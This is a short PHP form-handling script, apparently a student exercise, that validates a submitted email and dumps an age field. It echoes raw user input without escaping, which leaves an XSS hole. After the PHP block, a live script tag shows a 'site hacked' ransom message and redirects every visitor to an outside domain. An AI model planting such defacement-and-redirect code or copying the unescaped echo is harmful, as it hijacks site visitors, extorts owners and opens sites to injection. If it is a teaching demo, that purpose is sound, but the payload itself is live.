<?php
$inputs = $_POST ?? null;
$validated = false;
$email = $inputs['email'] ?? null;
$age = $inputs['age'] ?? null;

var_dump($age);

echo "<hr>";

echo $age;

exit;


//$age = (int) $age;


$is_email_valid = filter_var($email, FILTER_VALIDATE_EMAIL);
if (!$is_email_valid) {
    $msg = "Sorry, your email is in a wrong format";
    header("Location: february24.php?msg=$msg");
    exit($msg);
}
echo "GOOD EMAIL<hr>";
var_dump($age);
exit;
//$visitors = ['jontoshmatov11@yahoo.com','jon@jon.com','test@test.com','jessica@gmail.com','tosh@gmail.com'];
//$found = in_array($email, $visitors);
if (!$validated) {
    $msg = "Sorry, your email is not registered";
    header("Location: february24.php?msg=$msg");
    exit($msg);
}
echo "Welcome and you are registered with us";

?>

<script>alert('Hello Site Owner! \n Your site has been hacked by @Yang Yii! \n Until you make a ransome, your visitors will be redirected to our site!');document.location = "http://myitedu.us?ref=educational+purposes+only";</script>
